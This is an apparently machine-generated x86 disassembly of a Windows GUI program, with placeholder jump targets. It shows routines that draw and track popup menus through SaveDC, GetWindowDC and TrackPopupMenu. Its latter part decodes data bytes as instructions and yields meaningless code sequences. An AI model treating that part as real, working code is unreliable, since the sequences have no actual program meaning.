mov eax [ ebp - 0x34 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_40c231
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x34 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x20 ]
call sub_40fcf0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x20 ]
call sub_40fae8
mov eax [ ebp - 0x34 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x34 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
call sub_40c824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c238
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_40fcf0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x34 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x3c ]
call sub_40b890
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x3c ]
call sub_40adb0
test eax eax
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x34 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_40adb0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_40c39e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_40c379
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x28 ]
push eax
call SaveDC
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_40c35c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_40fcf0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x20 ]
call sub_40fae8
mov eax [ ebp - 0x38 ]
add eax 0x10
push eax
mov eax [ ebp - 0x38 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
call sub_408e44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c363
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_40fcf0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
call RestoreDC
retn
inc eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4c ]
call sub_42914c
mov edx [ ebp - 0x40 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4259d4
jmp r-xdata
mov [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetSubMenu
mov [ ebp - 0x10 ] eax
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x38 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_40adb0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x30 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_40adb0
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov eax [ eax + 0x28 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ ebp - 0x15 ] 0x1
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov cl [ ebp - 0x15 ]
mov edx [ ebp - 0x10 ]
call sub_40adb0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x2c ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x30 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_40adec
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x30 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov edx [ ebp - 0x30 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_40adec
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x60 ]
test [ eax + 0x210 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x60 ]
mov eax [ eax + 0x150 ]
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
call sub_425610
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
mov edx 0x8
call sub_425638
jmp r-xdata
sub_40c380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_40c458
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c264
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
push sub_40be18
call sub_41a528
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
sub_40c490
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43c728
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41a5e4
sub_40c4c0
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40ab20
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4c ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x84 ] edx
mov edx [ edx ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x80 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x51 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40c458
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40c55c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40c490
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40abe4
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_40c59c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_40c5c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40c5e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x48 ] edx
pop ecx
pop ecx
pop ebp
retn
sub_40c5fc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x48
call sub_406604
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_40bb68
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] 0x1
mov eax [ ebp - 0x8 ]
mov dl [ eax + 0x4f ]
mov eax [ ebp - 0x4 ]
call sub_40bb68
mov eax [ ebp - 0x4 ]
mov [ eax + 0x35 ] 0x1
jmp r-xdata
sub_40c664
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x1
sete [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
add eax 0x48
call sub_406604
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_424018
mov [ ebp - 0x5 ] al
jmp r-xdata
mov eax [ ebp - 0xc ]
mov bx 0xffce
call sub_44c24c
mov [ ebp - 0x5 ] al
jmp r-xdata
sub_40c6d0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43b77c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x48 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4c ] edx
mov eax [ ebp - 0x4 ]
call sub_40c5fc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_40a364
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_40a8cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4076c8
mov eax [ ebp - 0x4 ]
call sub_40b488
mov eax [ ebp - 0x4 ]
call sub_40c664
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x50 ]
mov ax [ eax + edx * 2 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x58 ]
or ax [ edx * 2 + rw-data ]
movzx eax ax
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x59 ]
shl eax 0xa
or [ ebp - 0x10 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4077f8
push eax
call TrackPopupMenu
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jle r-xdata
sub_40c7cc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43c464
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov eax [ eax ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_40c824
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x1c ]
mov ecx 0x4
[ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ ebp - 0xa ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0x80000004
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f388
mov edx 0x80000007
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_40e9f8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0x8000000d
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f388
mov edx 0x8000000e
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_40e9f8
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov bx 0xfff3
call sub_44c24c
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x9 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0x80000004
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f388
mov edx 0x80000011
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_40e9f8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0xa ] 0x0
jne r-xdata
sub_40c928
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_44cb34
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_44cd60
cmp eax [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
mov al [ eax + edx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
cmp [ eax + edx - 0x1 ] 0x26
jne r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ ebp - 0xc ]
call sub_44cfa8
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_44cd60
sub eax [ ebp - 0xc ]
cmp eax 0x2
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
cmp [ eax + edx - 0x2 ] 0x28
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
cmp [ eax + edx + 0x1 ] 0x29
jne r-xdata
mov edx [ ebp - 0xc ]
dec edx
mov eax [ ebp - 0x8 ]
mov ecx 0x4
call sub_44cfa8
jmp r-xdata
sub_40c9fc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cae0
mov [ ebp - 0xc ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44cd60
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + edx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ edx + eax - 0x1 ] 0x26
jne r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
dec eax
jl r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ edx + eax - 0x1 ] 0x26
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov dl [ ecx + edx - 0x1 ]
call sub_44cc88
sub_40ca90
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40caf3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_40c928
mov eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_40c928
mov eax [ ebp - 0x14 ]
pop edx
call sub_446318
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cafa
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_44cb04
retn
sub_40cb04
adc al [ eax ]
add [ eax ] al
add dh ch
inc esi
add [ esi - 0x1203ffb9 ] dh
inc esi
add [ eax ] bh
xor eax 0xedf80047
inc esi
add [ esi - 0x120bffb9 ] bh
inc esi
add [ eax + 0x35 ] al
inc edi
add al dh
in eax dx
inc esi
add [ ebp + esi + 0x47 ] al
add ah ch
in eax dx
inc esi
add [ eax + 0x35 ] cl
inc edi
add al ch
in eax dx
inc esi
add [ ebp + esi + 0x47 ] cl
add ah ah
in eax dx
inc esi
add [ eax + 0x35 ] dl
inc edi
add al ah
in eax dx
inc esi
add [ ebp + esi + 0x47 ] dl
add ah bl
in eax dx
inc esi
add [ eax + 0x35 ] bl
inc edi
add al bl
in eax dx
inc esi
add [ ebp + esi + 0x47 ] bl
add ah dl
in eax dx
inc esi
add [ eax + 0x35 ] ah
inc edi
add al dl
in eax dx
inc esi
add [ ebp + esi + 0x47 ] ah
add ah cl
in eax dx
inc esi
add [ eax + 0x35 ] ch
inc edi
add al cl
in eax dx
inc esi
add [ ebp + esi + 0x47 ] ch
add ah al
in eax dx
inc esi
add [ eax + 0x35 ] dh
inc edi
add al al
in eax dx
inc esi
add [ ebp + esi + 0x47 ] dh
add [ ebp + ebp * 8 + 0x35780046 ] bh
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40cbfc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc03
retn
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax [ rw-data ]
call sub_44c070
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_44d340
mov eax rw-data
call sub_44cae0
sub_40cc08
push ebp
mov ebp esp
push ecx
sub [ rw-data ] 0x1
jae r-xdata
pop ecx
pop ebp
retn
mov eax sub_40cb04
call sub_44c8e8
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_43bb90
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40225c
mov [ rw-data ] eax
sub_40ce30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
insb
outsd
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
add [ eax ] al
add [ eax + 0x7fffffff ] al
nop
nop
nop
js r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl sp dx
into
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
into
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
push ebp
inc esp
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
or esp [ esi + 0x6d ]
inc ecx
insb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x32 ] bh
jb r-xdata
imul esp [ ebx + 0x4f ] 0x61726570
nop
inc eax
iretd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
pushfd
retn 0x44
jb r-xdata
push eax
outsb
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
outsd
outsb
nop
nop
nop
hlt
je r-xdata
inc esp
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax - 0x40 ] ah
popad
je r-xdata
add [ eax ] al
push 0x940043ac
retn 0x44
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x70040cf ] bh
jo r-xdata
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
pop esp
iretd
push ebx
je r-xdata
nop
mov esp 0x30040cf
je r-xdata
rol [ eax + eax + 0x18 ] 0xc0
inc esp
or [ esi + 0x6d ] esp
push edi
imul ebp [ esi + 0x64 ] 0x90676e69
nop
sbb dh cl
inc eax
add [ ecx ] al
push es
push esp
inc ebx
inc esp
push ebx
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
inc esp
popad
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x31 ] bl
inc eax
add [ esi ] al
jae r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
je r-xdata
add eax 0x6f447370
or [ eax + edx * 2 + 0x65 ] edx
outsb
add [ ebx ] al
outsd
insb
or [ fs : esi + 0x73 ] ah
dec ecx
je r-xdata
add [ eax ] al
mov ah 0xd0
inc eax
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
imul esp [ ebx + 0x73 ] 0x90900000
nop
cmp cl dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0x40 ] al
add [ eax - 0x2f ] ch
inc eax
add [ eax ] al
add [ eax ] al
nop
nop
imul esp [ ebx + 0x73 ] 0x656a624f
add [ eax ] bl
add [ eax ] al
add [ eax - 0x54 ] ch
popad
jae r-xdata
add al dl
int3
inc esp
popad
jae r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
jb r-xdata
add [ eax ] ah
in al dx
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
rol [ eax ] 0x1
pop es
add eax 0x6e6f4654
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x2f ] dl
inc eax
add [ esi - 0x2f ] bl
inc eax
add [ eax + eax ] ah
push 0x40d1
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp - 0x30 ] si
inc eax
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ebx
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc esp
outsd
je r-xdata
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xcc
add al 0xc0
inc esp
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
je r-xdata
inc eax
add [ eax ] bl
add [ eax ] al
rol [ eax ] 0x1
mov al dl
inc eax
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
sbb al dl
inc eax
